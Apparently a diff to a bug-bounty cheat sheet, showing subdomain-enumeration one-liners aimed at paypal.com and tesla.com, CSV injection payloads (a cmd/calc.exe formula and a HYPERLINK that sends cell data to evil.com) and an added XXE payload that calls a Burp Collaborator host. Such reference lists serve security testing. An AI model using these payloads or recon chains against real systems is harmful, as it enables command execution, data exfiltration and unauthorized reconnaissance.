@@ -38,6 +38,8 @@ python3 -m http.server + port(default 8000)
  • https://joe.black/leakengine.html
 
 
+
+===========Open-source intelligence (OSINT)================
 assetfinder -subs-only http://paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
 
 rush -j100 -i bitquark-subdomains-top100000.txt 'curl -s -L "https://dns.google.com/resolve?name{}.tesla.com&type=A&cd=true" | sed "s#\"#\n#g;s# #\n#g" | grep "tesla"' | sed 's#\.$##g' | anew teslaDomains 
@@ -590,3 +592,7 @@ CSV Injection - At present, the best defense strategy we are aware of is prefixi
 =cmd|’/Ccalc.exe’!z
 =HYPERLINK(“http://evil.com?x="&A3&","&B3&"[CR]","Error fetching info: Click me to resolve.”)
 
+ 
+XXE
+------------------------------------------
+<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
